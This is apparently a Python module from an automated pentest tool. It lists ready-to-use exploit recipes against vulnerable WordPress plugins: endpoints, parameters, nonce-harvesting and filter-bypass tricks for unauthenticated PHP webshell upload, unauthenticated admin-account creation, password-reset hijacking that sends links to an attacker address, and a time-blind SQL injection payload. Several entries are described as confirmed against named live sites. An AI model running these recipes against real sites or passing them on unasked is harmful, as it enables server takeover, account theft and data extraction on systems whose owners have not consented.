"""Curated unauthenticated WordPress webshell-upload recipes."""

RECIPES = [
    {
        "plugin": "wp-file-manager",
        "cve": "CVE-2020-25213",
        "affected": "<=6.8",
        "method": "POST",
        "endpoint": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        "params": {"cmd": "upload", "target": "l1_Lw"},
        "field": "upload[]",
        "upload_path": "/wp-content/plugins/wp-file-manager/lib/files/{filename}",
        "source": "registry",
        "note": "elFinder connector exposed unauthenticated; no extension check.",
    },
    {
        "plugin": "wpdiscuz",
        "cve": "CVE-2020-24186",
        "affected": ">=7.0.0,<=7.0.4",
        "mode": "comment-image-upload",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "wmuUploadFiles"},
        "field": "wmu_files[0]",
        # No upload_path: wpdiscuz stores at /uploads/YYYY/MM/<name>-<microtime>.php
        # (unguessable). The handler reads the real URL back out of the JSON
        # response (data.previewsData.images[].url) instead of templating a path.
        #
        # LIVE-VERIFIED end-to-end (georgeagent.com, wpdiscuz 7.0.4 → uid=33
        # www-data). Three things a naive raw upload gets wrong, all handled by
        # mode "comment-image-upload":
        #   1. wmuSecurity is wp_create_nonce()'d into the localized JS only where
        #      the comment form renders. On a static front page '/' has none, so
        #      the handler discovers a commentable post (wp-json) and harvests
        #      there. A nonce-less request is rejected -1/403 by check_ajax_referer.
        #   2. wpdiscuz content-inspects the file (getimagesize/finfo): a bare
        #      <?php blob returns 'Not allowed file type'. The handler leads the
        #      payload with a GIF89a header; the .php name is kept so it executes.
        #   3. The real landed path is parsed from the response, never guessed.
        "nonce_from": {"url": "/", "key": "wmuSecurity", "param": "wmu_nonce"},
        "source": "registry",
        "note": "wmuUploadFiles accepts an image-headed .php once given a real "
                "wmuSecurity nonce (harvested from a post where the comment form "
                "renders, not a static front page); the shell lands at an "
                "unguessable /uploads/YYYY/MM/ path read back from the JSON reply. "
                "Confirmed live: uid=33(www-data) on wpdiscuz 7.0.4.",
    },
    {
        "plugin": "revslider",
        "cve": "CVE-2014-9735",
        "affected": "<=3.0.95",
        "mode": "zip-extract",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "revslider_ajax_action", "client_action": "update_plugin"},
        "field": "update_file",
        "zip_inner_path": "revslider/{filename}",
        "upload_path": "/wp-content/plugins/revslider/temp/update_extract/revslider/{filename}",
        "source": "registry",
        # Verified against the Metasploit module wp_revslider_upload_execute:
        # update_plugin extracts the uploaded zip into temp/update_extract/, so a
        # zip carrying revslider/<shell>.php lands reachable there. UNAUTH only on
        # <=3.0.95 (the SoakSoak vector); modern revslider gates this behind admin.
        # The fingerprinter can't read revslider's version, so MATCH may fire this
        # on any revslider — VERIFY (confirmed exec) is what keeps it honest.
        "note": "revslider_ajax_action/update_plugin extracts an attacker zip; ship "
                "a PHP shell inside revslider/. Unauth in <=3.0.95.",
    },
    {
        "plugin": "ninja-forms-uploads",
        "cve": "CVE-2026-0740",
        "affected": "<=3.3.24",
        "mode": "nonce-traversal",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "nf_fu_upload"},
        "nonce_action": "nf_fu_get_new_nonce",
        "upload_action": "nf_fu_upload",
        "field": "files-{field_id}",
        "dest_param": "image_jpg",
        "traversal_prefix": "../",
        "upload_path": "/wp-content/uploads/ninja-forms/{filename}",
        "source": "registry",
        # Verified against the public PoC (github.com/whattheslime/CVE-2026-0740)
        # and Lexfo's write-up: nf_fu_get_new_nonce hands a valid upload nonce to
        # ANY caller for an arbitrary field_id (no auth, no ownership check), then
        # nf_fu_upload trusts the client-supplied 'image_jpg' destination verbatim
        # into move_uploaded_file() (CWE-434) — one '../' escapes the tmp/ landing
        # dir into the plugin's own uploads dir. Traversal + arbitrary extension
        # (.php) only works <=3.3.24; 3.3.25/3.3.26 close traversal but still allow
        # .phtml/.phar/.pht uploads (not built here) before the full fix in 3.3.27.
        "note": "nf_fu_get_new_nonce(field_id) mints an upload nonce unauth; "
                "nf_fu_upload trusts the client's 'image_jpg' destination path "
                "verbatim → path traversal out of wp-content/uploads/ninja-forms/"
                "tmp/. Confirmed <=3.3.24 (later versions gate traversal, not extension).",
    },
    {
        "plugin": "simple-file-list",
        "cve": "CVE-2025-34085",
        "affected": "<=4.2.2",
        "mode": "upload-then-rename",
        "method": "POST",
        "endpoint": "/wp-content/plugins/simple-file-list/ee-upload-engine.php",
        "rename_endpoint": "/wp-content/plugins/simple-file-list/ee-file-engine.php",
        "params": {"eeSFL_ID": "1"},
        "list_id": "1",
        "upload_dir": "/wp-content/uploads/simple-file-list/",
        "token_salt": "unique_salt",
        "rename_extensions": ["php", "phtml", "php5", "php3"],
        "field": "file",
        "upload_path": "/wp-content/uploads/simple-file-list/{filename}",
        "source": "registry",
        # Verified against the real vulnerable source (v4.2.2, both
        # ee-upload-engine.php and ee-file-engine.php): BOTH endpoints
        # register their nonce check via add_action('plugins_loaded',
        # 'eeSFL_CheckNonce') -- but that runs mid-script, AFTER each script's
        # own manual `include(wp-load.php)` bootstrap has already fired
        # plugins_loaded, so the callback is registered too late and NEVER
        # actually runs. No nonce required at all despite the code appearing
        # to check one. Upload is extension-whitelisted (png passes), but the
        # separate rename endpoint (eeFileAction=f"Rename|{new_name}") applies
        # ZERO validation to the new extension -- rename png→php and it's a
        # live shell. The upload 'security token' is
        # md5('unique_salt' + $_POST['eeSFL_Timestamp']) -- a literal string
        # hardcoded in the public plugin source, computed locally here.
        "note": "Unauth upload (extension-whitelisted) + unauth rename (zero "
                "validation) = arbitrary PHP execution. Both endpoints' nonce "
                "checks are dead code (registered on plugins_loaded AFTER that "
                "hook already fired in the script's own bootstrap); the "
                "upload token is a hardcoded salt in the plugin source, not a "
                "real secret.",
    },
    {
        "plugin": "breeze",
        "cve": "CVE-2026-3844",
        "affected": "<=2.4.4",
        "mode": "comment-avatar-ssrf",
        "method": "POST",
        "endpoint": "/wp-comments-post.php",
        "params": {},
        "author_field": "author",
        "post_id": 1,
        "field": "author",
        "upload_path": "/wp-content/cache/breeze-extra/gravatars/{filename}",
        "source": "registry",
        # REAL FARM MATCH (2026-07-17): an admin found
        # wp-content/cache/breeze-extra/gravatars/footer.jpg.php on the
        # actual compromised farm -- an exact match for this CVE's path and
        # the classic double-extension shell-naming pattern. Verified against
        # BOTH the current patched source and the actual vulnerable 2.4.4
        # source (wp.org SVN): fetch_gravatar_from_remote() in <=2.4.4 does
        # zero host/MIME/extension validation and resolves to exactly
        # content_url('/cache/breeze-extra/gravatars/' . $blog_id .
        # $gravatar_name) -- the patched version added a gravatar.com host
        # check + an image/jpeg|png|gif whitelist.
        #
        # UNLIKE every other recipe here, this is SSRF-shaped: WE inject a
        # URL, the TARGET fetches it -- so the payload must be reachable BY
        # THE TARGET, not just describable by us. pentest-agent cannot
        # conjure that reachability itself. Operator must host a payload
        # (generate one with `python3 -c "from wp.exploit import
        # build_payload; print(build_payload())"` so its token matches what
        # wp_verify expects) somewhere the target can reach, then pass
        # --callback-url <that URL> --callback-token <that token>.
        #
        # Mechanism (verified against the real PoC, github.com/dinosn/
        # CVE-2026-3844): POST a comment to wp-comments-post.php with
        # author=f"x srcset={callback_url}" (get_avatar()'s $alt param is
        # populated from the comment author name; breeze_replace_gravatar_
        # image()'s regex scans the resulting avatar HTML for a srcset/src
        # value with no regard for which HTML attribute it came from), then
        # visit the post page to trigger get_avatar -> fetch_gravatar_from_
        # remote() -> download with zero validation.
        #
        # PRECONDITION (per the public writeups, not yet independently
        # re-derived from source here): "Host Files Locally - Gravatars"
        # setting must be enabled (non-default) + comments open on >=1 post.
        "note": "Unauth SSRF-triggered fetch via a comment's forged srcset -> "
                "fetch_gravatar_from_remote() saves ANY URL with zero MIME/"
                "extension check. REQUIRES an operator-hosted payload "
                "(--callback-url/--callback-token) since the target fetches "
                "the file itself; pentest-agent can't host it for you. Also "
                "requires 'Host Files Locally - Gravatars' enabled (non-"
                "default) and comments open on the target post.",
    },
]


def find_recipes(plugin_slug):
    return [r for r in RECIPES if r["plugin"] == plugin_slug]


# ── Track B: privilege-escalation recipes (unauth → admin account) ────────────
# These don't upload a shell directly; they grant an ADMIN account, which the
# authenticated-webshell stage (wp_authshell) then uses to plant a shell.
# Privilege-escalation recipes for Track B. wp_privesc.acquire_admin dispatches
# on "kind"; each kind reads a fixed set of fields — confirm every value against
# the CVE's PoC before running against a real target. Shapes:
#
#   register-role   : {endpoint, action, user_field, email_field, pass_field,
#                      role_param, role_value}  → creates an admin with our creds.
#   options-update  : {endpoint, option_name_param, option_value_param,
#                      set_options:{users_can_register:"1", default_role:"administrator"},
#                      register_endpoint, user_field, email_field, [pass_field]}
#                      → forces open registration + admin default role, registers.
#   auth-bypass     : {endpoint, method:"GET"|"POST", params}  → leaves the
#                      session authenticated as admin (returns {"authed": True}).
#   password-reset  : {endpoint, target_user, user_param, pass_param, params}
#                      → resets a known admin's password to one we choose.
PRIVESC_RECIPES = [
    {
        "plugin": "lastudio-element-kit",
        "cve": "CVE-2026-0920",
        "affected": "<=1.5.6.3",
        "kind": "register-role",
        "endpoint": "/wp-admin/admin-ajax.php",
        # ajax_register_handle is hooked to a nopriv AJAX action; the exact
        # action string should be confirmed against the plugin source / PoC.
        "action": "lastudio_register",
        "user_field": "user_login",
        "email_field": "email",
        "pass_field": "password",
        "role_param": "lakit_bkrole",
        "role_value": "administrator",
        "source": "registry",
        "note": "ajax_register_handle honours lakit_bkrole → unauth admin registration.",
    },
    {
        "plugin": "kirki",
        "cve": "CVE-2026-8206",
        "affected": ">=6.0.0,<=6.0.6",
        "kind": "account-takeover-oob",
        "method": "POST",
        "endpoint": "/wp-json/KirkiComponentLibrary/v1/kirki-forgot-password",
        # CONFIRM-ONLY. The forgot-password REST route (CompLibFormHandler) has a
        # missing permission check and trusts a client-supplied 'email', so it
        # mails the reset link for `target_user` to an ATTACKER address. We can't
        # read that mailbox, so the tool proves the primitive (200 + marker) and
        # stops; completing the takeover is a manual step from the attacker inbox.
        "target_user": "admin",
        "user_param": "username",
        "email_param": "email",
        "attacker_email": "pentest@mail.invalid",
        "extra_params": {
            "emailSubject": "Password Reset",
            "emailBody": '[{"type":"text","value":"Reset your password:\\n"},'
                         '{"type":"chip","value":"reset_link"}]',
        },
        # PRECONDITION (confirmed from source, live-tested): the permission
        # check IS a no-op (get_item_permissions_check() -> true), but
        # validate_nonce() strictly requires wp_verify_nonce($nonce,
        # 'KirkiComponentLibrary_kirki-forgot-password') -- a nonce scoped to
        # THIS exact action. That nonce is only ever minted by
        # ElementGenerator::add_nonce_to_element(), which only fires while
        # rendering a page built with Kirki's own page-builder ("ComponentLibrary")
        # that actually places a Login/Register/Forgot-Password/Change-Password/
        # Retrieve-Username/Comment element on it. A vanilla kirki install with
        # no such page has NO page anywhere that exposes a validly-scoped nonce
        # -- the generic homepage/wpApiSettings nonce this harvester finds is
        # for a different action and will always fail wp_verify_nonce() here.
        # So despite SCAN's "self-contained unauth" classification (heuristic,
        # not a weaponizability guarantee -- see wp_vulns.precondition), this
        # CVE is only reachable on sites that built such a component-library
        # page. If you've confirmed the real target has one, scrape ITS nonce
        # (component_lib_forms[...].nonce in that page's inline JS) and set a
        # static "nonce" field here to override the harvester.
        "nonce_header": "X-WP-ELEMENT-NONCE",
        "success_marker": "Email sent",
        "source": "registry",
        "note": "Unauth arbitrary-email password reset (CVE-2026-8206, missing "
                "permission check). Confirm-only: reset link is emailed to the "
                "attacker; finish takeover from that mailbox. REQUIRES the "
                "target to have a Kirki page-builder page with a Forgot-"
                "Password (or sibling) ComponentLibrary element -- otherwise "
                "no page ever exposes the action-scoped nonce validate_nonce() "
                "demands, and the request fails 'Not authorized' even though "
                "the permission check itself is real and missing.",
    },
    {
        "plugin": "opal-estate-pro",
        "cve": "CVE-2025-6934",
        "affected": "<=1.7.5",
        "kind": "register-role",
        "endpoint": "/wp-admin/admin-ajax.php",
        "action": "opalestate_register_form",
        "user_field": "username",
        "email_field": "email",
        "pass_field": "password",
        "pass_confirm_field": "password1",
        "role_param": "role",
        "role_value": "administrator",
        # on_regiser_user's nonce check reads this hidden input off the site's
        # own homepage (not a separate /register/ page) — confirmed from the
        # public PoC (github.com/Nxploited/CVE-2025-6934).
        "nonce_from": {"url": "/", "field": "opalestate-register-nonce"},
        "extra_params": {
            "confirmed_register": "on",
            "_wp_http_referer": "/",
            "ajax": "1",
        },
        "source": "registry",
        "note": "on_regiser_user doesn't restrict the 'role' param during "
                "registration (CWE-269) → unauth attacker-chosen role, "
                "including administrator.",
    },
]


def find_privesc(plugin_slug):
    return [r for r in PRIVESC_RECIPES if r["plugin"] == plugin_slug]


# ── unauthenticated SQL-injection recipes (wp_sqli confirms/extracts) ──────────
# Success = proof that attacker SQL executed (a timing delta), NOT a shell. The
# payload is an ORDER BY-context injection: {cond} gates a SLEEP({sleep}).
SQLI_RECIPES = [
    {
        "plugin": "wp-google-map-plugin",
        "cve": "CVE-2026-2580",
        "affected": "<=4.9.1",
        "kind": "time-blind",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        # LIVE-VERIFIED end-to-end (askgeorgeai.com, WP MAPS 4.9.1): a clean
        # +5s delta on SLEEP(5) vs control, and CASE WHEN (1=1/1=2) discriminates.
        #
        # Full unauth chain, all read from the installed 4.9.1 source:
        #   admin-ajax action wpgmp_ajax_call (registered nopriv) runs
        #   check_ajax_referer('fc-call-nonce','nonce') then $this->$operation($_POST).
        #   operation=wpgmp_processor reads $_GET['page']=wpgmp_manage_map, builds
        #   WPGMP_Maps_Table, whose constructor calls init_listing()->prepare_items()
        #   BEFORE any auth check. There:
        #       $orderby = sanitize_text_field($_GET['orderby']);  // keeps ( ) , etc.
        #       $query  .= " order by {$orderby} {$order}";        // raw, no prepare
        # So the request is a POST (the ajax dispatch) whose ORDER BY sink reads
        # $_GET — hence method POST but inject_in 'params'. The fc-call-nonce is
        # localized into the frontend map object as `nonce` (harvested from '/').
        #
        # NOTE the sink runs inside `SELECT * FROM wp_create_map ORDER BY <inj>`, so
        # the injection only times out when the maps table has >=1 row — true on any
        # real WP MAPS deployment (a site with no maps isn't using the plugin).
        "params": {"page": "wpgmp_manage_map", "order": "asc"},
        "data": {"action": "wpgmp_ajax_call", "operation": "wpgmp_processor"},
        "inject_param": "orderby",       # 'order' is a second raw sink (fallback)
        "inject_in": "params",           # $_GET sink even though the request is POST
        "nonce_from": {"url": "/", "key": "nonce", "param": "nonce", "into": "data"},
        "payload": "(SELECT CASE WHEN ({cond}) THEN SLEEP({sleep}) ELSE 0 END)",
        "true_cond": "1=1",
        "false_cond": "1=2",
        "source": "registry",
        "note": "Unauth time-based blind SQLi via orderby. nopriv wpgmp_ajax_call "
                "(fc-call-nonce, harvested as `nonce` off the frontend) dispatches "
                "operation=wpgmp_processor + page=wpgmp_manage_map into "
                "prepare_items(), whose raw `order by {orderby}` runs pre-auth. "
                "Confirmed live: +5s SLEEP delta on WP MAPS 4.9.1.",
    },
]


def find_sqli(plugin_slug):
    return [r for r in SQLI_RECIPES if r["plugin"] == plugin_slug]
